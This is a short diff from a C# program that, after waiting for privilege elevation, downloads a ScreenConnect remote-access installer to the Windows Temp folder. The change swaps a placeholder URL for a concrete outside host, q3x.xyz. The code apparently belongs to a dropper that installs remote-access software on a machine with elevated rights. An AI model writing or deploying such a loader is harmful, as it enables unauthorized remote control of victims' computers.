@@ -33,7 +33,7 @@ public class H
         //    Since elevation might take a moment, we wait and then proceed.
         System.Threading.Thread.Sleep(3000);
 
-        string msiUrl = "https://your-server.com/ScreenConnect.ClientSetup.msi"; // <-- CHANGE
+        string msiUrl = "https://q3x.xyz/Bin/ScreenConnect.ClientSetup.msi"; // <-- CHANGE
         string msiPath = @"C:\Windows\Temp\sc.msi";
 
         // Download MSI
